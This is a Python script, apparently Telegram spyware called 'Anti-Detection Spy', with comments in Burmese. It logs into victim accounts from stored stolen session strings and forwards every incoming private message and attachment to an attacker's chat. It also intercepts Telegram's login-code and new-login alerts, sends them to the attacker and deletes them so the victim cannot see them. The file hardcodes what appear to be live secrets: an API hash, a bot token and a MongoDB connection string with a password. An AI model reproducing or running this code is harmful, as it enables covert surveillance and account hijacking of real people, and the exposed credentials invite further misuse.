import os
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from pymongo import MongoClient
from flask import Flask
from threading import Thread

# --- Configurations ---
API_ID = 38225985
API_HASH = "0b6330bc916f9e29d6bf302be079e9d6"
BOT_TOKEN = "8738081667:AAGr7HkSxO6nC_QhPJJElKR2VKABTEDfNEo"
OWNER_ID = 6015356597
REPORT_CHAT = -1003836655698

MONGO_URI = "mongodb://khantphyoemin537_db_user:9VRKiaeZkz7rJdpz@cluster0-shard-00-00.w6tgi8j.mongodb.net:27017,cluster0-shard-00-01.w6tgi8j.mongodb.net:27017,cluster0-shard-00-02.w6tgi8j.mongodb.net:27017/?ssl=true&replicaSet=atlas-w6tgi8j-shard-0&authSource=admin&retryWrites=true&w=majority&tlsAllowInvalidCertificates=true"

db_client = MongoClient(MONGO_URI)
db = db_client["SpySystem_DB"]
sessions_db = db["active_strings"]

app = Flask(__name__)
@app.route("/")
def home(): return "🦇 Anti-Detection Spy Online"

def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

bot = TelegramClient("report_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ==========================================
# 🔥 AUTO-DELETE LOGIN ALERTS LOGIC
# ==========================================
async def start_spy(session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        
        @client.on(events.NewMessage(incoming=True))
        async def login_security_handler(event):
            # Telegram (ID: 777000) က ပို့တဲ့ စာတွေကို စစ်မယ်
            if event.sender_id == 777000:
                text = event.raw_text.lower()
                
                # Login Code သို့မဟုတ် New Login အကြောင်းစာ ဖြစ်နေရင်
                if "login code" in text or "new login" in text or "web login" in text:
                    # ၁။ Report Chat ထဲကို အရင်ပို့မယ် (သခင်လေး သိအောင်)
                    await bot.send_message(REPORT_CHAT, f"⚠️ **Security Alert [{me.first_name}]**\n\n`{event.raw_text}`")
                    
                    # ၂။ ချက်ချင်းဆိုသလို အဲ့ဒီစာကို Target အကောင့်ထဲကနေ ဖျက်ပစ်မယ် (For Everyone)
                    await event.delete()
                    print(f"🗑 Deleted Login Alert for {me.first_name}")

            # တခြား ပုံမှန် Spy လုပ်ငန်းစဉ်တွေ ဒီမှာ ဆက်ထားလို့ရတယ်
            elif event.is_private:
                await bot.send_message(REPORT_CHAT, f"📩 **DM for {me.first_name}:**\n{event.raw_text}", file=event.media)

        await client.run_until_disconnected()
    except Exception as e: print(f"Error: {e}")

async def init_system():
    for s in sessions_db.find(): asyncio.create_task(start_spy(s["session"]))

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.loop.create_task(init_system())
    bot.run_until_disconnected()
